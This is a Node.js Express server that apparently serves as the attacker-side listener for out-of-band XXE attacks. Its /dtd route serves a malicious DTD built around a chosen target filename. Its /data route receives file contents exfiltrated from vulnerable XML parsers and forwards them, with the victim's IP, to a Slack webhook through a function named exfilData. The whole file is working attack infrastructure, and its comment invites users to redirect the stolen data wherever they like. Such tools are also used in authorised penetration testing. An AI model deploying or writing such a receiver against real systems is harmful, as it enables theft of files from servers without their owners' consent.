const express = require('express');
const hbs = require('express-handlebars');
const requestIp = require('request-ip');

const slackWebhook = require('slack-webhook');
const WEBHOOK_URL = process.env.SLACK_WEBHOOK;
const slack = new slackWebhook(WEBHOOK_URL);

const app = express()


app.engine('.hbs', hbs( {
  extname: 'hbs',
}));
app.set('view engine', '.hbs');
app.set('views', __dirname + '/templates')

const ipMiddleware = (req, res, next) => {
  let clientIp;
  if (req.header('cf-connecting-ip')){
    req.clientIp = req.header('cf-connecting-ip'); // I want to always give priority to this header
  } else {
    req.clientIp = requestIp.getClientIp(req); // if it's not there then fall back
  }
  next();
};

app.use(ipMiddleware);


app.get('/dtd', (req, res) => {
  console.log('dtd requested');
  let template = '';
  if (req.query.filename) { 
    template = 'dtd_with_file';
  } else {
    template = 'dtd';
  }
  let context = {
    'fileName': req.query.filename ? req.query.filename : null,
    'hostName': req.hostname,
    'protocol': 'https'
  }
  res.setHeader('Content-Type', 'application/xml-dtd');
  res.render(template, context);
});


app.get('/data', (req, res) => {
  let data = decodeURIComponent(req.originalUrl.substring(6));
  console.log('data received');
  exfilData({'data': data, 'clientIp': req.clientIp});
  res.send('');
});

app.listen(3000, () => console.log("Listening on 3000"));

// Modify this function to log the data wherever you'd prefer

async function exfilData(exfil) {
  try {
    await slack.send(`*Data from:* \`${exfil.clientIp}\`\n\`\`\`${exfil.data}\`\`\``);
  } catch (err) {
    throw new Error('Problem posting to Slack webhook');
  }

}
